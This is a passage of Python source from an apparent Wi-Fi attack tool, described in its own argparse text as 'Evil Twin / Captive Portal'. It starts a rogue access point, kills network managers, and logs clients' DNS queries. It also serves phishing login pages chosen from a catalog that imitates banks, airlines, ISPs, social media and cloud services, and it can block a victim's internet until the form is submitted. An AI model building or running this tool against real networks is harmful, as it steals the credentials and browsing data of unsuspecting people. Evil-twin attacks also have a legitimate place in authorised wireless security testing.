                    RealtimeLogger.step("Blocking internet access until form submission...")
                    try:
                        # DROP all forwarded traffic from AP clients
                        subprocess.run([
                            "iptables", "-I", "FORWARD",
                            "-s", f"{AP_SUBNET}.0/24",
                            "-j", "DROP"
                        ], capture_output=True, timeout=5)
                        # But still allow the captive portal HTTP server
                        subprocess.run([
                            "iptables", "-I", "FORWARD",
                            "-s", f"{AP_SUBNET}.0/24",
                            "-d", AP_IP,
                            "-j", "ACCEPT"
                        ], capture_output=True, timeout=5)
                        RealtimeLogger.ok("Internet blocked — will grant after form submission")
                    except Exception as e:
                        RealtimeLogger.warn(f"Failed to block internet: {e}")

        # Captive portal (if not DNS-only)
        if not dns_only and portal_html:
            RealtimeLogger.step("Starting captive portal web server...")
            internet_before = getattr(self, '_internet_before_form', True)
            # When internet_before_form is True: allow all traffic (no blocking)
            # When internet_before_form is False: block all, grant after form submit
            self.portal_server = CaptivePortalServer(
                port=8080,
                portal_html=portal_html,
                success_html=success_html,
                grant_internet_after_submit=not internet_before,  # True when we need to block+grant
                internet_before_form=internet_before,
                ap_interface=self.interface
            )
            self.portal_server.start()

        self._running = True

        # Print status
        RealtimeLogger.separator()
        RealtimeLogger.ok(f"AP Mode is LIVE!")
        RealtimeLogger.info(f"  SSID      : {self.ssid}")
        RealtimeLogger.info(f"  Interface : {self.interface}")
        RealtimeLogger.info(f"  Channel   : {self.channel}")
        RealtimeLogger.info(f"  IP        : {AP_IP}")
        RealtimeLogger.info(f"  DHCP Range: {AP_DHCP_START} — {AP_DHCP_END}")
        if not dns_only:
            RealtimeLogger.info(f"  Portal    : http://{AP_IP}:8080")
        if enable_internet:
            RealtimeLogger.ok("  Internet  : ENABLED (NAT forwarding)")
        else:
            RealtimeLogger.info("  Internet  : OFF")
        if dns_only:
            RealtimeLogger.info(f"  DNS Log   : {DNS_LOG}")
        else:
            RealtimeLogger.info(f"  Capture Log: {CAPTURED_LOG}")
        RealtimeLogger.separator()
        RealtimeLogger.info("Press Ctrl+C to stop the AP and clean up...")
        RealtimeLogger.separator()

        return True

    def _setup_interface(self):
        """Put the interface into AP-compatible state."""
        # Kill interfering processes
        for proc in ["wpa_supplicant", "dhclient", "dhcpcd", "NetworkManager"]:
            subprocess.run(["killall", proc], capture_output=True, timeout=3)

        # Set monitor mode off (AP uses managed mode)
        subprocess.run(["ip", "link", "set", self.interface, "down"],
                       capture_output=True, timeout=5)
        subprocess.run(["iw", self.interface, "set", "type", "managed"],
                       capture_output=True, timeout=5)
        subprocess.run(["ip", "link", "set", self.interface, "up"],
                       capture_output=True, timeout=5)
        time.sleep(1)

    def wait(self):
        """Block until Ctrl+C is pressed."""
        try:
            while self._running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

    def stop(self):
        """Stop all AP components and clean up."""
        RealtimeLogger.separator()
        RealtimeLogger.step("Stopping AP Mode...")

        self._running = False

        # Stop captive portal
        if self.portal_server:
            self.portal_server.stop()

        # Stop DNS logger
        if self.dns_logger:
            self.dns_logger.stop()

        # Stop dnsmasq
        if self.dnsmasq_proc:
            self.dnsmasq_proc.terminate()
            try:
                self.dnsmasq_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.dnsmasq_proc.kill()
            RealtimeLogger.info("dnsmasq stopped")

        # Stop hostapd
        if self.hostapd_proc:
            self.hostapd_proc.terminate()
            try:
                self.hostapd_proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.hostapd_proc.kill()
            RealtimeLogger.info("hostapd stopped")

        # Also kill any remaining instances
        subprocess.run(["killall", "hostapd"], capture_output=True, timeout=3)
        subprocess.run(["killall", "dnsmasq"], capture_output=True, timeout=3)

        # Cleanup internet forwarding
        cleanup_internet_forwarding()

        # Cleanup temp files
        for f in [HOSTAPD_CONF, DNSMASQ_CONF]:
            try:
                os.remove(f)
            except OSError:
                pass

        # Print session summary with data folder
        tracker = CaptureTracker.get_instance()
        print(tracker.get_summary())
        RealtimeLogger.separator()


# ──────────────────────────────────────────────────────────────
# Interactive AP Mode Launcher
# ──────────────────────────────────────────────────────────────
def launch_ap_mode(interface: str):
    """Interactive launcher for AP Mode with all user prompts.

    Flow:
      1. Check AP support on the adapter
      2. Pure DNS traffic log mode? (Y/N)
      3. Internet access through AP? (Y/N)
      4. HTML selection (only if not DNS-only)
      5. Post-submission internet? (only if HTML selected)
      6. SSID & Channel
      7. Start AP
    """
    RealtimeLogger.separator()
    RealtimeLogger.banner("WiFi4 AP MODE SETUP")
    RealtimeLogger.separator()

    # ── Step 1: Check AP support ──
    if not check_ap_support(interface):
        RealtimeLogger.err("This interface does not support AP (Access Point) mode.")
        RealtimeLogger.info("Try a different WiFi adapter that supports AP/Master mode.")
        RealtimeLogger.info("USB WiFi adapters (Alfa, TP-Link) typically support AP mode.")
        return

    # ── Step 2: DNS-only mode? ──
    print()
    print("  \033[1;36m┌──────────────────────────────────────────────┐\033[0m")
    print("  \033[1;36m│\033[0m  \033[1;97mPure DNS Traffic Log Mode?\033[0m                  \033[1;36m│\033[0m")
    print("  \033[1;36m│\033[0m                                              \033[1;36m│\033[0m")
    print("  \033[1;36m│\033[0m  \033[90mNo HTML / No Captive Portal — just log all\033[0m  \033[1;36m│\033[0m")
    print("  \033[1;36m│\033[0m  \033[90mDNS queries from connected clients.\033[0m          \033[1;36m│\033[0m")
    print("  \033[1;36m└──────────────────────────────────────────────┘\033[0m")
    print()
    try:
        dns_choice = input("  Switch to pure DNS traffic log mode? [y/N]: ").strip().lower()
        dns_only = dns_choice in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        dns_only = False

    # ── Step 3: Internet access through AP? ──
    print()
    RealtimeLogger.info("Do you want to provide internet access through this AP?")
    print("  \033[90m(Connected clients will be able to browse the internet)\033[0m")
    try:
        internet_choice = input("  Enable internet access? [y/N]: ").strip().lower()
        enable_internet = internet_choice in ("y", "yes")
    except (EOFError, KeyboardInterrupt):
        enable_internet = False

    # ── Step 4: HTML selection (only if NOT DNS-only) ──
    portal_html = ""
    success_html = ""
    html_selected = False

    if not dns_only:
        print()
        RealtimeLogger.info("Captive Portal HTML selection:")
        print("  \033[1;33m1)\033[0m Use default WiFi4 captive portal")
        print("  \033[1;33m2)\033[0m Browse template catalog (\033[1;32m154 templates\033[0m)")
        print("  \033[1;33m3)\033[0m Use HTML file from current directory")
        print("  \033[1;33m4)\033[0m Specify custom HTML file path")
        print()

        while True:
            try:
                html_choice = input("  Select HTML source [1-4]: ").strip()
                if html_choice in ("1", "2", "3", "4"):
                    break
                print("  \033[1;31mPlease enter 1, 2, 3, or 4\033[0m")
            except (EOFError, KeyboardInterrupt):
                return

        # ── Build HTML source options ──
        catalog_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "captive_portal", "catalog")
        categories = []
        if os.path.isdir(catalog_dir):
            for cat_name in sorted(os.listdir(catalog_dir)):
                cat_path = os.path.join(catalog_dir, cat_name)
                if os.path.isdir(cat_path):
                    count = len(list(Path(cat_path).glob("*.html")))
                    if count > 0:
                        categories.append((cat_name, cat_path, count))

        # Check for HTML files in current directory
        cwd_html_files = list(Path(".").glob("*.html"))

        cat_icons = {
            "custom": "🎨", "social_media": "📱",
            "airlines": "✈️", "us_airlines": "🇺🇸",
            "brands": "🏷️", "tech": "💻",
            "fast_food": "🍔", "gyms": "💪",
            "hotels": "🏨", "internet_providers": "🌐",
            "us_isps": "📡", "railway_companies": "🚂",
            "supermarkets": "🛒", "theme_parks": "🎢",
            "wifi_routers": "📡", "test_prank": "🎭",
            "payment_banking": "💳", "cloud_services": "☁️", "streaming": "🎬"
        }
        cat_labels = {
            "custom": "Custom Portals", "social_media": "Social Media",
            "airlines": "Airlines (EU)", "us_airlines": "US Airlines",
            "brands": "Brands", "tech": "Tech Companies",
            "fast_food": "Fast Food & Coffee", "gyms": "Gyms & Fitness",
            "hotels": "Hotels", "internet_providers": "ISPs (EU)",
            "us_isps": "US ISPs & Carriers", "railway_companies": "Railway Companies",
            "supermarkets": "Supermarkets", "theme_parks": "Theme Parks",
            "wifi_routers": "WiFi Routers", "test_prank": "Test & Prank Pages",
            "payment_banking": "Payment & Banking", "cloud_services": "Cloud Services", "streaming": "Streaming"
        }

        # Build menu options
        menu_options = []  # (number, label, type)
        opt_num = 1
        for cat_name, _, count in categories:
            icon = cat_icons.get(cat_name, "📁")
            label = cat_labels.get(cat_name, cat_name.replace("_", " ").title())
            menu_options.append((opt_num, f"{icon} {label} ({count} templates)", "category", cat_name))
            opt_num += 1

        if cwd_html_files:
            menu_options.append((opt_num, f"📂 Current directory ({len(cwd_html_files)} files)", "cwd"))
            opt_num += 1

        menu_options.append((opt_num, "📁 Custom HTML file path", "custom"))

        print()
        print("  \033[1;36m┌──────────────────────────────────────────────┐\033[0m")
        print("  \033[1;36m│\033[0m  \033[1;97mCaptive Portal HTML Source\033[0m                   \033[1;36m│\033[0m")
        print("  \033[1;36m└──────────────────────────────────────────────┘\033[0m")
        print()
        for num, label, *rest in menu_options:
            print(f"    \033[1;33m{num})\033[0m {label}")
        print()

        # Select source
        max_opt = menu_options[-1][0]
        while True:
            try:
                src_choice = input(f"  Select [1-{max_opt}]: ").strip()
                src_idx = int(src_choice)
                chosen = None
                for num, label, otype, *rest in menu_options:
                    if num == src_idx:
                        chosen = (otype, rest)
                        break
                if chosen:
                    break
                print("  \033[1;31mInvalid selection\033[0m")
            except (ValueError, EOFError, KeyboardInterrupt):
                RealtimeLogger.info("Falling back to default captive portal")
                portal_html = _load_template("login.html")
                success_html = _load_template("success.html")
                html_selected = True
                break

        if not html_selected and chosen:
            src_type, src_rest = chosen

            if src_type == "category":
                # ── Show templates inside selected category ──
                cat_name = src_rest[0]
                cat_path = os.path.join(catalog_dir, cat_name)
                label = cat_labels.get(cat_name, cat_name.replace("_", " ").title())
                templates = sorted(Path(cat_path).glob("*.html"))

                print()
                RealtimeLogger.info(f"{label} — {len(templates)} templates:")
                print()
                for i, tmpl in enumerate(templates, 1):
                    display = tmpl.stem.replace("_", " ").replace("-", " ")
                    print(f"    \033[1;33m{i:>3})\033[0m {display}")
                print()

                while True:
                    try:
                        tmpl_input = input(f"  Select template [1-{len(templates)}]: ").strip()
                        tmpl_idx = int(tmpl_input) - 1
                        if 0 <= tmpl_idx < len(templates):
                            selected_file = templates[tmpl_idx]
                            portal_html = selected_file.read_text(encoding="utf-8")
                            RealtimeLogger.ok(f"Using: {selected_file.name}")
                            html_selected = True
                            break
                        print("  \033[1;31mInvalid selection\033[0m")
                    except (ValueError, EOFError, KeyboardInterrupt):
                        RealtimeLogger.info("Falling back to default captive portal")
                        portal_html = _load_template("login.html")
                        success_html = _load_template("success.html")
                        html_selected = True
                        break

            elif src_type == "cwd":
                print()
                RealtimeLogger.info(f"HTML files in current directory:")
                for i, f in enumerate(cwd_html_files, 1):
                    print(f"    \033[1;33m{i})\033[0m {f.name}")
                print()
                while True:
                    try:
                        file_choice = input(f"  Select file [1-{len(cwd_html_files)}]: ").strip()
                        idx = int(file_choice) - 1
                        if 0 <= idx < len(cwd_html_files):
                            portal_html = cwd_html_files[idx].read_text(encoding="utf-8")
                            RealtimeLogger.ok(f"Using {cwd_html_files[idx].name}")
                            html_selected = True
                            break
                        print("  \033[1;31mInvalid selection\033[0m")
                    except (ValueError, EOFError, KeyboardInterrupt):
                        RealtimeLogger.info("Falling back to default captive portal")
                        portal_html = _load_template("login.html")
                        success_html = _load_template("success.html")
                        html_selected = True
                        break

            elif src_type == "custom":
                while True:
                    try:
                        custom_path = input("  Enter HTML file path: ").strip()
                        if not custom_path:
                            continue
                        custom_path = os.path.expanduser(custom_path)
                        if os.path.isfile(custom_path):
                            portal_html = Path(custom_path).read_text(encoding="utf-8")
                            RealtimeLogger.ok(f"Using custom HTML: {custom_path}")
                            html_selected = True
                            break
                        else:
                            print(f"  \033[1;31mFile not found: {custom_path}\033[0m")
                    except (EOFError, KeyboardInterrupt):
                        RealtimeLogger.info("Falling back to default captive portal")
                        portal_html = _load_template("login.html")
                        success_html = _load_template("success.html")
                        html_selected = True
                        break

        success_html = success_html or _load_template("success.html")

    # ── Step 5: Internet before form fill? (only if HTML was selected) ──
    internet_before_form = False
    if html_selected:
        print()
        print("  \033[1;36m┌──────────────────────────────────────────────┐\033[0m")
        print("  \033[1;36m│\033[0m  \033[1;97mInternet Before Form Fill?\033[0m                    \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m                                              \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m  \033[90mY = internet works IMMEDIATELY,\033[0m              \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m  \033[90m   even before filling the form\033[0m              \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m                                              \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m  \033[90mN = internet ONLY after form submit,\033[0m        \033[1;36m│\033[0m")
        print("  \033[1;36m│\033[0m  \033[90m   no internet until they fill up\033[0m            \033[1;36m│\033[0m")
        print("  \033[1;36m└──────────────────────────────────────────────┘\033[0m")
        print()
        try:
            pre_choice = input("  Grant internet before form fill? [Y/n]: ").strip().lower()
            internet_before_form = pre_choice not in ("n", "no")
        except (EOFError, KeyboardInterrupt):
            internet_before_form = True

    # ── Step 6: SSID configuration ──
    print()
    try:
        ssid_input = input(f"  AP Name (SSID) [{AP_SSID}]: ").strip()
        ssid = ssid_input if ssid_input else AP_SSID
    except (EOFError, KeyboardInterrupt):
        ssid = AP_SSID

    # ── Step 7: Channel configuration ──
    try:
        ch_input = input(f"  WiFi Channel [{AP_CHANNEL}]: ").strip()
        channel = ch_input if ch_input and ch_input.isdigit() else AP_CHANNEL
    except (EOFError, KeyboardInterrupt):
        channel = AP_CHANNEL

    # ── Initialize Capture Tracker with session folder ──
    tracker = CaptureTracker.get_instance()
    tracker.init(ssid)

    # ── Print configuration summary ──
    RealtimeLogger.separator()
    RealtimeLogger.info("AP Configuration Summary:")
    if dns_only:
        RealtimeLogger.info("  Mode            : Pure DNS Traffic Logger")
    else:
        RealtimeLogger.info("  Mode            : Captive Portal")
    RealtimeLogger.info(f"  SSID            : {ssid}")
    RealtimeLogger.info(f"  Channel         : {channel}")
    RealtimeLogger.info(f"  Internet (AP)   : {'ON' if enable_internet else 'OFF'}")
    if html_selected:
        RealtimeLogger.info(f"  HTML Portal     : YES")
        RealtimeLogger.info(f"  Internet before form: {'ON (immediate)' if internet_before_form else 'OFF (after submit only)'}")
    else:
        RealtimeLogger.info(f"  HTML Portal     : NONE (DNS-only logging)")
    RealtimeLogger.info(f"  Session folder  : {tracker.session_dir}")
    RealtimeLogger.separator()

    # ── Step 8: Start the AP ──
    manager = APManager(interface, ssid, channel)

    # Pass internet_before_form to manager for post-submit logic
    manager._internet_before_form = internet_before_form

    started = manager.start(
        dns_only=dns_only,
        portal_html=portal_html,
        success_html=success_html,
        enable_internet=enable_internet
    )

    if not started:
        RealtimeLogger.err("Failed to start AP Mode")
        return

    # ── Step 9: Wait for Ctrl+C ──
    try:
        manager.wait()
    except KeyboardInterrupt:
        pass
    finally:
        manager.stop()


def _load_template(name: str) -> str:
    """Load an HTML template from the templates directory."""
    path = os.path.join(TEMPLATES_DIR, name)
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except FileNotFoundError:
        RealtimeLogger.warn(f"Template {name} not found at {path}")
        # Return a minimal fallback
        return f"<html><body><h1>WiFi4 AP Mode</h1><p>{name}</p></body></html>"


# ──────────────────────────────────────────────────────────────
# CLI Entry Point (for direct invocation)
# ──────────────────────────────────────────────────────────────
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="WiFi4 AP Mode — Evil Twin / Captive Portal"
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="WiFi interface to use as AP")
    parser.add_argument("-s", "--ssid", default=AP_SSID,
                        help=f"AP SSID (default: {AP_SSID})")
    parser.add_argument("-c", "--channel", default=AP_CHANNEL,
                        help=f"WiFi channel (default: {AP_CHANNEL})")
    parser.add_argument("--dns-only", action="store_true",
                        help="DNS-only logging mode (no captive portal)")
    parser.add_argument("--html", type=str,
                        help="Path to custom HTML file for captive portal")
    parser.add_argument("--internet", action="store_true",
                        help="Enable internet forwarding through AP")

    args = parser.parse_args()

    if os.getuid() != 0:
        RealtimeLogger.err("AP mode requires root. Run with: sudo wifi4 --ap-mode")
        sys.exit(1)

    # If specific options provided, skip interactive prompts
    if args.dns_only or args.html or args.internet:
        portal_html = ""
        success_html = ""
        if not args.dns_only:
            if args.html and os.path.isfile(args.html):
                portal_html = Path(args.html).read_text(encoding="utf-8")
            else:
                portal_html = _load_template("login.html")
            success_html = _load_template("success.html")

        manager = APManager(args.interface, args.ssid, args.channel)
        started = manager.start(
            dns_only=args.dns_only,
            portal_html=portal_html,
            success_html=success_html,
            enable_internet=args.internet
        )
        if started:
            try:
                manager.wait()
            except KeyboardInterrupt:
                pass
            finally:
                manager.stop()
    else:
        # Full interactive mode
        launch_ap_mode(args.interface)
